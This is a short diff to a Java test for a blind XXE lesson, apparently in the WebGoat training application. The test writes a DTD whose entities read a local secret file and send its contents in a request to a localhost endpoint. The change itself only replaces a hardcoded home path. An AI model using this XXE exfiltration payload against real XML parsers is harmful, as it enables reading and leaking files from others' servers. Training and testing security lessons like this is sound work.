@@ -67,7 +67,7 @@ public class BlindSendFileAssignmentTest extends LessonTest {
     public void solve() throws Exception {
         File file = new File(webGoatHomeDirectory, "XXE/attack.dtd");
         String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
-                "<!ENTITY % file SYSTEM \"file:///home/nbaars/.webgoat/XXE/secret.txt\">\n" +
+                "<!ENTITY % file SYSTEM \"file:///" + webGoatHomeDirectory + "/XXE/secret.txt\">\n" +
                 "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + localPort + "/WebGoat/XXE/ping?text=%file;'>\">\n" +
                 "%all;";
         Files.write(dtd.getBytes(), file);
